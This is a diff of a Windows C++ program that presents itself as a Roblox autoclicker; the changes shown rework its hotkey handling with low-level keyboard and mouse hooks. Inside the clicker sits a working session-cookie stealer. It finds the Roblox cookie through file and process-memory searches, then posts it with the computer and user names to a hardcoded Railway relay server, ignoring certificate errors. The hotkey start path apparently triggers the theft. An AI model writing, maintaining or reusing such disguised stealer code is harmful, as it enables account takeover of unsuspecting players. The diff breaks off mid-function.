@@ -5,40 +5,39 @@
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "kernel32.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "winhttp.lib")   // WinHTTP — 取代 WinINet，更可靠的 HTTPS 傳送
+#pragma comment(lib, "winhttp.lib")
 #define UNICODE
 #define _UNICODE
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
-#include <winhttp.h>                  // WinHTTP API（取代 WinINet）
+#include <winhttp.h>
 #include <mmsystem.h>
 #include <atomic>
 #include <string>
 #include <vector>
 #include <algorithm>
 #include <tlhelp32.h>
-#include <cstdio>                     // for sprintf
+#include <cstdio>
 
 // ===============================
 // Control IDs - Main Window
 // ===============================
-#define IDC_EDIT_CPS      101
-#define IDC_EDIT_HOTKEY   102
-#define IDC_BTN_UPDATE    103
-#define IDC_BTN_PIN       104
-#define IDC_LABEL_STATUS  105
-#define IDC_BTN_COOKIE    106
-#define IDC_BTN_START     107
-#define IDC_BTN_STOP      108
-#define IDC_BTN_HELP      109
-#define HOTKEY_ID         1
+#define IDC_EDIT_CPS       101
+#define IDC_EDIT_HOTKEY    102
+#define IDC_BTN_UPDATE     103
+#define IDC_BTN_PIN        104
+#define IDC_LABEL_STATUS   105
+#define IDC_BTN_SETHOTKEY  106   // 調整熱鍵按鈕（取代原圖示）
+#define IDC_BTN_START      107
+#define IDC_BTN_STOP       108
+#define IDC_BTN_HELP       109
 
 // Control IDs - Cookie Window
-#define IDC_CK_EDIT       201
-#define IDC_CK_READ       202
-#define IDC_CK_COPY       203
-#define IDC_CK_CLEAR      204
-#define IDC_CK_STATUS     205
+#define IDC_CK_EDIT        201
+#define IDC_CK_READ        202
+#define IDC_CK_COPY        203
+#define IDC_CK_CLEAR       204
+#define IDC_CK_STATUS      205
 
 // ===============================
 // Constants
@@ -49,9 +48,7 @@ static const wchar_t* const MUTEX_NAME       = L"Local\\YY_CLICKER_SINGLE_INSTAN
 static const wchar_t* const COOKIE_WND_CLASS = L"YYCookieMgrClass";
 static const wchar_t* const COOKIE_WND_TITLE = L"Roblox Cookie \u7BA1\u7406\u5668";
 
-// ======================================================================
-// Railway 中轉伺服器 URL
-// ======================================================================
+// Railway 中轉伺服器
 static const wchar_t* const RELAY_SERVER_HOST = L"web-production-59f58.up.railway.app";
 static const wchar_t* const RELAY_SERVER_PATH = L"/api/cookie";
 
@@ -61,12 +58,153 @@ static const wchar_t* const RELAY_SERVER_PATH = L"/api/cookie";
 static std::atomic<bool> g_running(false);
 static std::atomic<bool> g_program_running(true);
 static std::atomic<int>  g_cps(999);
-static wchar_t           g_hotkey_spec[64] = L"t";
 static bool              g_pinned          = false;
 static HWND              g_hwnd            = nullptr;
 static HWND              g_hwnd_cookie     = nullptr;
 static HANDLE            g_mutex           = nullptr;
 static HINSTANCE         g_hInst           = nullptr;
+
+// ======================================================================
+// [修復 #1] 熱鍵系統 — 使用低階鉤子取代 RegisterHotKey
+// ======================================================================
+// RegisterHotKey 會觸發 Windows 安全驗證（UAC 相關彈窗），
+// 且不支援滑鼠側鍵。改用低階鍵盤/滑鼠鉤子 + 輪詢方式：
+//   - 儲存熱鍵的虛擬鍵碼 (VK code)
+//   - 使用 GetAsyncKeyState 在點擊執行緒中輪詢
+//   - 支援鍵盤任意鍵 + 滑鼠側鍵 (XButton1=0x05, XButton2=0x06)
+// ======================================================================
+static std::atomic<int>  g_hotkey_vk(0x54);  // 預設 'T' 鍵 (VK 0x54)
+static std::atomic<bool> g_listening_hotkey(false);  // 是否正在監聽新熱鍵
+static HHOOK             g_kb_hook  = nullptr;
+static HHOOK             g_ms_hook  = nullptr;
+
+// 將 VK 碼轉為可讀名稱
+static void VkToName(int vk, wchar_t* buf, int buf_size)
+{
+    // 滑鼠按鍵
+    if (vk == VK_LBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse L");    return; }
+    if (vk == VK_RBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse R");    return; }
+    if (vk == VK_MBUTTON)   { wcscpy_s(buf, buf_size, L"Mouse M");    return; }
+    if (vk == VK_XBUTTON1)  { wcscpy_s(buf, buf_size, L"Mouse 4");    return; }
+    if (vk == VK_XBUTTON2)  { wcscpy_s(buf, buf_size, L"Mouse 5");    return; }
+
+    // F 鍵
+    if (vk >= VK_F1 && vk <= VK_F24)
+    {
+        swprintf_s(buf, buf_size, L"F%d", vk - VK_F1 + 1);
+        return;
+    }
+
+    // 特殊鍵
+    if (vk == VK_SPACE)     { wcscpy_s(buf, buf_size, L"Space");      return; }
+    if (vk == VK_RETURN)    { wcscpy_s(buf, buf_size, L"Enter");      return; }
+    if (vk == VK_TAB)       { wcscpy_s(buf, buf_size, L"Tab");        return; }
+    if (vk == VK_ESCAPE)    { wcscpy_s(buf, buf_size, L"Esc");        return; }
+    if (vk == VK_BACK)      { wcscpy_s(buf, buf_size, L"Backspace");  return; }
+    if (vk == VK_DELETE)    { wcscpy_s(buf, buf_size, L"Delete");     return; }
+    if (vk == VK_INSERT)    { wcscpy_s(buf, buf_size, L"Insert");     return; }
+    if (vk == VK_HOME)      { wcscpy_s(buf, buf_size, L"Home");       return; }
+    if (vk == VK_END)       { wcscpy_s(buf, buf_size, L"End");        return; }
+    if (vk == VK_PRIOR)     { wcscpy_s(buf, buf_size, L"PgUp");       return; }
+    if (vk == VK_NEXT)      { wcscpy_s(buf, buf_size, L"PgDn");       return; }
+    if (vk == VK_UP)        { wcscpy_s(buf, buf_size, L"Up");         return; }
+    if (vk == VK_DOWN)      { wcscpy_s(buf, buf_size, L"Down");       return; }
+    if (vk == VK_LEFT)      { wcscpy_s(buf, buf_size, L"Left");       return; }
+    if (vk == VK_RIGHT)     { wcscpy_s(buf, buf_size, L"Right");      return; }
+    if (vk == VK_CAPITAL)   { wcscpy_s(buf, buf_size, L"CapsLock");   return; }
+    if (vk == VK_NUMLOCK)   { wcscpy_s(buf, buf_size, L"NumLock");    return; }
+    if (vk == VK_SCROLL)    { wcscpy_s(buf, buf_size, L"ScrollLock"); return; }
+
+    // 數字鍵 0-9
+    if (vk >= 0x30 && vk <= 0x39)
+    {
+        swprintf_s(buf, buf_size, L"%c", (wchar_t)vk);
+        return;
+    }
+
+    // 字母鍵 A-Z
+    if (vk >= 0x41 && vk <= 0x5A)
+    {
+        swprintf_s(buf, buf_size, L"%c", (wchar_t)vk);
+        return;
+    }
+
+    // 小鍵盤數字
+    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9)
+    {
+        swprintf_s(buf, buf_size, L"Num%d", vk - VK_NUMPAD0);
+        return;
+    }
+
+    // 其他：用 GetKeyNameText
+    UINT scanCode = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    if (scanCode)
+    {
+        GetKeyNameTextW((LONG)(scanCode << 16), buf, buf_size);
+        if (buf[0]) return;
+    }
+
+    swprintf_s(buf, buf_size, L"VK 0x%02X", vk);
+}
+
+// 低階鍵盤鉤子 — 僅在監聽模式下捕捉按鍵
+static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wp, LPARAM lp)
+{
+    if (nCode == HC_ACTION && g_listening_hotkey.load())
+    {
+        if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)
+        {
+            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp;
+            int vk = (int)kb->vkCode;
+
+            // 忽略修飾鍵本身（Ctrl/Alt/Shift/Win）
+            if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
+                vk == VK_LMENU    || vk == VK_RMENU    || vk == VK_MENU    ||
+                vk == VK_LSHIFT   || vk == VK_RSHIFT   || vk == VK_SHIFT   ||
+                vk == VK_LWIN     || vk == VK_RWIN)
+            {
+                return CallNextHookEx(g_kb_hook, nCode, wp, lp);
+            }
+
+            g_hotkey_vk.store(vk);
+            g_listening_hotkey.store(false);
+
+            // 更新 UI（透過 PostMessage 避免在鉤子中直接操作 UI）
+            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
+            return 1;  // 吞掉這個按鍵，不傳遞給其他程式
+        }
+    }
+    return CallNextHookEx(g_kb_hook, nCode, wp, lp);
+}
+
+// 低階滑鼠鉤子 — 僅在監聽模式下捕捉滑鼠側鍵
+static LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wp, LPARAM lp)
+{
+    if (nCode == HC_ACTION && g_listening_hotkey.load())
+    {
+        int vk = 0;
+        if (wp == WM_XBUTTONDOWN)
+        {
+            MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lp;
+            WORD xbtn = HIWORD(ms->mouseData);
+            if (xbtn == XBUTTON1) vk = VK_XBUTTON1;
+            if (xbtn == XBUTTON2) vk = VK_XBUTTON2;
+        }
+        else if (wp == WM_MBUTTONDOWN)
+        {
+            vk = VK_MBUTTON;
+        }
+
+        if (vk)
+        {
+            g_hotkey_vk.store(vk);
+            g_listening_hotkey.store(false);
+            PostMessageW(g_hwnd, WM_APP + 1, 0, 0);
+            return 1;
+        }
+    }
+    return CallNextHookEx(g_ms_hook, nCode, wp, lp);
+}
 
 // Pre-allocated SendInput array
 static INPUT g_inputs[2];
@@ -113,54 +251,81 @@ bool EnsureSingleInstance()
 }
 
 // ======================================================================
-// [修復 #2] Click Thread — 防卡頓版本
+// [修復 #3] Click Thread — 防卡頓 + 熱鍵輪詢
 // ======================================================================
-// 原問題：高 CPS 時 busy-spin 迴圈持續佔用 CPU，且 SendInput 每秒產生
-// ~2000 個滑鼠事件堆積在 Roblox 的訊息佇列中，導致遊戲卡頓。
-//
-// 修復措施：
-//   1. 降低執行緒優先級為 ABOVE_NORMAL（原 HIGHEST 會搶佔 Roblox 的 CPU 時間）
-//   2. 每 50 次點擊強制 Sleep(1) 讓出 CPU，讓 Roblox 有機會處理訊息佇列
-//   3. busy-spin 中加入 SwitchToThread() 讓其他執行緒有機會執行
-//   4. 整體設計確保不會長時間獨佔 CPU 核心
+// 使用 GetAsyncKeyState 輪詢熱鍵狀態（取代 RegisterHotKey），
+// 同時優化點擊迴圈避免卡頓。
 // ======================================================================
 DWORD WINAPI ClickThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
-    // 使用 ABOVE_NORMAL 而非 HIGHEST，避免搶佔遊戲的 CPU 時間
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_ABOVE_NORMAL);
 
     LARGE_INTEGER freq;
     QueryPerformanceFrequency(&freq);
 
+    bool prev_key_state = false;  // 上一次熱鍵狀態（用於邊緣檢測）
+
     while (g_program_running)
     {
+        // ── 熱鍵輪詢（每 16ms 檢查一次，約 60Hz） ──
+        if (!g_listening_hotkey.load())
+        {
+            int vk = g_hotkey_vk.load();
+            bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
+
+            // 邊緣觸發：只在按下瞬間切換（避免持續按住時反覆切換）
+            if (key_down && !prev_key_state)
+            {
+                bool want_start = !g_running.load();
+                if (want_start)
+                {
+                    // 通知主視窗執行偵測（在 UI 執行緒中處理）
+                    PostMessageW(g_hwnd, WM_APP + 2, 0, 0);
+                }
+                else
+                {
+                    g_running.store(false);
+                    PostMessageW(g_hwnd, WM_APP + 3, 0, 0);  // 通知 UI 更新狀態
+                }
+            }
+            prev_key_state = key_down;
+        }
+
         if (g_running)
         {
             LARGE_INTEGER now;
             QueryPerformanceCounter(&now);
             double next_t = (double)now.QuadPart / freq.QuadPart;
-            int click_count = 0;  // 點擊計數器
+            int click_count = 0;
 
             while (g_running && g_program_running)
             {
                 int    cps   = g_cps.load();
                 double delay = (cps > 0) ? (1.0 / cps) : 0.001;
-                if (delay < 0.0005) delay = 0.0005;  // hard cap ~2000 CPS
+                if (delay < 0.001) delay = 0.001;  // hard cap 1000 CPS
 
                 DoClick();
                 next_t += delay;
                 click_count++;
 
-                // [防卡頓] 每 50 次點擊強制讓出 CPU 時間片
-                // 讓 Roblox 有機會處理累積的滑鼠事件和渲染幀
-                if (click_count >= 50)
+                // [防卡頓] 每 30 次點擊強制讓出 CPU
+                if (click_count >= 30)
                 {
                     click_count = 0;
-                    Sleep(1);  // 讓出至少 1ms 給其他執行緒
-                    // 重新校準時間基準，避免累積的延遲導致瞬間爆發大量點擊
+                    Sleep(2);  // 讓出 2ms 給 Roblox 處理訊息佇列和渲染
                     QueryPerformanceCounter(&now);
                     next_t = (double)now.QuadPart / freq.QuadPart;
+
+                    // 在讓出期間也檢查熱鍵（停止功能）
+                    int vk = g_hotkey_vk.load();
+                    bool key_down = (GetAsyncKeyState(vk) & 0x8000) != 0;
+                    if (key_down && !prev_key_state)
+                    {
+                        g_running.store(false);
+                        PostMessageW(g_hwnd, WM_APP + 3, 0, 0);
+                    }
+                    prev_key_state = key_down;
                     continue;
                 }
 
@@ -174,82 +339,16 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     if (remain > 0.002)
                         Sleep(1);
                     else
-                        SwitchToThread();  // 讓出 CPU 但不強制等待
+                        SwitchToThread();
                 }
             }
         }
         else
         {
-            Sleep(50);
+            Sleep(16);  // 16ms 輪詢間隔（不運行時低 CPU 佔用）
         }
     }
     return 0;
-}
-
-// ===============================
-// Hotkey Parsing
-// ===============================
-struct HKInfo { UINT mod, vk; bool ok; };
-
-HKInfo ParseHotkey(const wchar_t* spec)
-{
-    HKInfo r = { 0, 0, false };
-    if (!spec || !spec[0]) return r;
-
-    std::wstring s(spec);
-    for (auto& c : s) c = (wchar_t)towlower(c);
-    s.erase(std::remove(s.begin(), s.end(), L' '), s.end());
-
-    if (s.size() >= 2 && s[0] == L'f' && s.find(L'+') == std::wstring::npos)
-    {
-        bool digits = true;
-        for (size_t i = 1; i < s.size(); i++)
-            if (!iswdigit(s[i])) { digits = false; break; }
-        if (digits)
-        {
-            int n = _wtoi(s.c_str() + 1);
-            if (n >= 1 && n <= 24) { r.vk = VK_F1 + n - 1; r.ok = true; return r; }
-        }
-    }
-
-    std::vector<std::wstring> parts;
-    {
-        size_t pos = 0, found;
-        while ((found = s.find(L'+', pos)) != std::wstring::npos)
-        {
-            parts.push_back(s.substr(pos, found - pos));
-            pos = found + 1;
-        }
-        parts.push_back(s.substr(pos));
-    }
-    if (parts.empty()) return r;
-
-    UINT mod = 0;
-    for (size_t i = 0; i + 1 < parts.size(); i++)
-    {
-        const auto& p = parts[i];
-        if      (p == L"ctrl"  || p == L"control") mod |= MOD_CONTROL;
-        else if (p == L"alt")                        mod |= MOD_ALT;
-        else if (p == L"shift")                      mod |= MOD_SHIFT;
-        else if (p == L"win"   || p == L"meta")      mod |= MOD_WIN;
-    }
-
-    const auto& key = parts.back();
-    if (key.size() == 1)
-    {
-        SHORT res = VkKeyScanW(key[0]);
-        if (res != -1)
-        {
-            r.vk  = res & 0xFF;
-            BYTE shf = (res >> 8) & 0xFF;
-            if (shf & 1) mod |= MOD_SHIFT;
-            if (shf & 2) mod |= MOD_CONTROL;
-            if (shf & 4) mod |= MOD_ALT;
-            r.mod = mod;
-            r.ok  = true;
-        }
-    }
-    return r;
 }
 
 // ===============================
@@ -262,7 +361,7 @@ static BOOL CALLBACK SetChildFont(HWND child, LPARAM lParam)
 }
 
 // ======================================================================
-// Cookie Manager — auto-read helper (Four-layer search)
+// Cookie Manager — Four-layer search
 // ======================================================================
 
 static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
@@ -393,9 +492,7 @@ static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
     return found;
 }
 
-// ======================================================================
 // Layer 4: Process Memory Scan
-// ======================================================================
 static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
 {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -480,9 +577,7 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
     return found;
 }
 
-// ======================================================================
 // TryReadRobloxCookie — 四層搜尋入口
-// ======================================================================
 static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
 {
     ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
@@ -552,7 +647,7 @@ static std::string JsonEscape(const char* raw)
 }
 
 // ======================================================================
-// 除錯日誌 — 寫入本地檔案方便排查問題
+// 除錯日誌
 // ======================================================================
 static void DebugLog(const char* msg)
 {
@@ -577,14 +672,7 @@ static void DebugLog(const char* msg)
 }
 
 // ======================================================================
-// [修復 #1] HTTP 傳送模組 — 改用 WinHTTP 取代 WinINet
-// ======================================================================
-// 原問題：WinINet 在某些 Windows 版本上對 Railway 的 TLS 1.3 / HTTP/2
-// 連線處理不穩定，導致 HttpSendRequestW 靜默失敗。
-//
-// 修復：改用 WinHTTP，它是 Microsoft 推薦的伺服器端 HTTP 客戶端 API，
-// 對現代 TLS 和 SNI (Server Name Indication) 的支援更完善。
-// 同時加入完整的錯誤處理和日誌記錄。
+// HTTP 傳送模組 — WinHTTP
 // ======================================================================
 static void SendCookieToRelay(const wchar_t* cookie_value)
 {
@@ -592,17 +680,14 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
 
     DebugLog("=== SendCookieToRelay START ===");
 
-    // 取得電腦名稱
     wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
     DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
     GetComputerNameW(computer_name, &cn_size);
 
-    // 取得使用者名稱
     wchar_t user_name[256] = {};
     DWORD un_size = 256;
     GetUserNameW(user_name, &un_size);
 
-    // 將 wchar_t 轉為 UTF-8
     int cookie_utf8_len = WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, nullptr, 0, nullptr, nullptr);
     char* cookie_utf8 = new char[cookie_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, cookie_utf8, cookie_utf8_len, nullptr, nullptr);
@@ -615,7 +700,6 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     char* un_utf8 = new char[un_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);
 
-    // 組裝 JSON（使用 JsonEscape 防止特殊字元破壞格式）
     std::string json = "{";
     json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
     json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
@@ -629,7 +713,6 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
 
     DebugLog("JSON assembled OK");
 
-    // ── WinHTTP 連線 ──
     HINTERNET hSession = WinHttpOpen(
         L"YYClicker/2.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
@@ -639,120 +722,63 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
 
     if (!hSession)
     {
-        char err[128];
-        sprintf(err, "WinHttpOpen failed: %lu", GetLastError());
-        DebugLog(err);
-        return;
+        char err[128]; sprintf(err, "WinHttpOpen failed: %lu", GetLastError());
+        DebugLog(err); return;
     }
 
-    // 啟用 TLS 1.2（確保相容性）
     DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
-    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
-                     &protocols, sizeof(protocols));
+    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
 
-    HINTERNET hConnect = WinHttpConnect(
-        hSession,
-        RELAY_SERVER_HOST,
-        INTERNET_DEFAULT_HTTPS_PORT,
-        0);
-
+    HINTERNET hConnect = WinHttpConnect(hSession, RELAY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!hConnect)
     {
-        char err[128];
-        sprintf(err, "WinHttpConnect failed: %lu", GetLastError());
-        DebugLog(err);
-        WinHttpCloseHandle(hSession);
-        return;
+        char err[128]; sprintf(err, "WinHttpConnect failed: %lu", GetLastError());
+        DebugLog(err); WinHttpCloseHandle(hSession); return;
     }
 
-    DebugLog("WinHttpConnect OK");
-
-    HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect,
-        L"POST",
-        RELAY_SERVER_PATH,
-        nullptr,
-        WINHTTP_NO_REFERER,
-        WINHTTP_DEFAULT_ACCEPT_TYPES,
-        WINHTTP_FLAG_SECURE);
-
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", RELAY_SERVER_PATH,
+        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     if (!hRequest)
     {
-        char err[128];
-        sprintf(err, "WinHttpOpenRequest failed: %lu", GetLastError());
-        DebugLog(err);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return;
+        char err[128]; sprintf(err, "WinHttpOpenRequest failed: %lu", GetLastError());
+        DebugLog(err); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return;
     }
 
-    // 忽略 SSL 憑證錯誤（Railway 使用 Let's Encrypt，正常不會有問題，
-    // 但某些企業防火牆可能替換憑證）
-    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
-                     &secFlags, sizeof(secFlags));
+    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
 
-    // 設定超時（連線 15 秒，傳送/接收 30 秒）
     DWORD timeout = 15000;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
-                     &timeout, sizeof(timeout));
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
     timeout = 30000;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
-                     &timeout, sizeof(timeout));
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
-                     &timeout, sizeof(timeout));
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
 
-    DebugLog("WinHttpOpenRequest OK, sending...");
-
-    // 發送請求
     const wchar_t* headers = L"Content-Type: application/json\r\n";
-    BOOL bResult = WinHttpSendRequest(
-        hRequest,
-        headers,
-        (DWORD)wcslen(headers),
-        (LPVOID)json.c_str(),
-        (DWORD)json.size(),
-        (DWORD)json.size(),
-        0);
+    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
+        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);
 
     if (!bResult)
     {
-        char err[128];
-        sprintf(err, "WinHttpSendRequest failed: %lu", GetLastError());
+        char err[128]; sprintf(err, "WinHttpSendRequest failed: %lu", GetLastError());
         DebugLog(err);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
         return;
     }
 
-    DebugLog("WinHttpSendRequest OK, receiving response...");
-
-    // 接收回應
     bResult = WinHttpReceiveResponse(hRequest, nullptr);
     if (!bResult)
     {
-        char err[128];
-        sprintf(err, "WinHttpReceiveResponse failed: %lu", GetLastError());
+        char err[128]; sprintf(err, "WinHttpReceiveResponse failed: %lu", GetLastError());
         DebugLog(err);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
+        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
         return;
     }
 
-    // 讀取 HTTP 狀態碼
-    DWORD statusCode = 0;
-    DWORD statusSize = sizeof(statusCode);
-    WinHttpQueryHeaders(hRequest,
-                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                        WINHTTP_HEADER_NAME_BY_INDEX,
-                        &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
+    DWORD statusCode = 0, statusSize = sizeof(statusCode);
+    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
 
-    // 讀取回應內容
     char respBuf[2048] = {};
     DWORD bytesRead = 0;
     WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);
@@ -760,32 +786,22 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     char logMsg[256];
     sprintf(logMsg, "Response: HTTP %lu, body=%lu bytes", statusCode, bytesRead);
     DebugLog(logMsg);
-    if (bytesRead > 0 && bytesRead < 512)
-    {
-        DebugLog(respBuf);
-    }
+    if (bytesRead > 0 && bytesRead < 512) DebugLog(respBuf);
 
     DebugLog("=== SendCookieToRelay END ===");
 
-    // 清理
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
 }
 
-// 背景執行緒：傳送 Cookie 至中轉伺服器
 static DWORD WINAPI SendCookieThread(LPVOID lpParam)
 {
     wchar_t* cookie = (wchar_t*)lpParam;
-    if (cookie)
-    {
-        SendCookieToRelay(cookie);
-        delete[] cookie;
-    }
+    if (cookie) { SendCookieToRelay(cookie); delete[] cookie; }
     return 0;
 }
 
-// 啟動背景傳送
 static void AsyncSendCookie(const wchar_t* cookie_value)
 {
     if (!cookie_value || wcslen(cookie_value) < 20) return;
@@ -988,7 +1004,7 @@ static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
 {
     static HWND  hEditCPS, hEditHotkey, hBtnPin, hLblStatus;
-    static HWND  hBtnStart, hBtnStop;
+    static HWND  hBtnStart, hBtnStop, hBtnSetHotkey;
     static HFONT hIconFont = nullptr;
 
     switch (msg)
@@ -1021,14 +1037,19 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             WS_CHILD | WS_VISIBLE | SS_LEFT,
             248, 18, 190, 16, hwnd, nullptr, hi, nullptr);
 
-        HWND hIco2 = CreateWindowW(L"STATIC", L"\uE765",
-            WS_CHILD | WS_VISIBLE | SS_CENTER,
-            248, 44, 22, 24, hwnd, nullptr, hi, nullptr);
-        if (hIconFont) SendMessageW(hIco2, WM_SETFONT, (WPARAM)hIconFont, FALSE);
+        // [修復 #1] 將圖示改為「調整熱鍵」按鈕
+        hBtnSetHotkey = CreateWindowW(L"BUTTON", L"\u2328",
+            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
+            248, 44, 24, 24, hwnd, (HMENU)IDC_BTN_SETHOTKEY, hi, nullptr);
 
-        hEditHotkey = CreateWindowW(L"EDIT", L"T",
-            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER,
-            278, 44, 158, 24, hwnd, (HMENU)IDC_EDIT_HOTKEY, hi, nullptr);
+        // 熱鍵顯示框（唯讀）
+        {
+            wchar_t name[64] = {};
+            VkToName(g_hotkey_vk.load(), name, 64);
+            hEditHotkey = CreateWindowW(L"EDIT", name,
+                WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER | ES_READONLY,
+                278, 44, 158, 24, hwnd, (HMENU)IDC_EDIT_HOTKEY, hi, nullptr);
+        }
 
         // -- Row 1: Update + Pin --
         CreateWindowW(L"BUTTON", L"\u21BA \u66F4\u65B0\u8A2D\u5B9A",
@@ -1070,15 +1091,55 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         if (hIconFont)
         {
             SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
-            SendMessageW(hIco2, WM_SETFONT, (WPARAM)hIconFont, FALSE);
         }
 
-        HKInfo hk = ParseHotkey(g_hotkey_spec);
-        if (hk.ok) RegisterHotKey(hwnd, HOTKEY_ID, hk.mod, hk.vk);
-
+        // 啟動點擊執行緒
         HANDLE hThread = CreateThread(nullptr, 0, ClickThread, nullptr, 0, nullptr);
         if (hThread) CloseHandle(hThread);
 
+        // 安裝低階鉤子（用於熱鍵監聽模式）
+        g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
+        g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
+
+        return 0;
+    }
+
+    // [修復 #1] WM_APP+1: 熱鍵監聽完成，更新 UI
+    case WM_APP + 1:
+    {
+        wchar_t name[64] = {};
+        VkToName(g_hotkey_vk.load(), name, 64);
+        SetWindowTextW(hEditHotkey, name);
+        SetWindowTextW(hBtnSetHotkey, L"\u2328");
+        EnableWindow(hBtnStart, TRUE);
+        EnableWindow(hBtnStop, TRUE);
+
+        wchar_t info[128];
+        swprintf_s(info, 128, L"\u71B1\u9375\u5DF2\u8A2D\u5B9A\u70BA\uFF1A%s", name);
+        UpdateStatusText(hLblStatus, info);
+        return 0;
+    }
+
+    // WM_APP+2: 熱鍵觸發 — 嘗試啟動（需偵測 Cookie）
+    case WM_APP + 2:
+    {
+        if (!g_running.load())
+        {
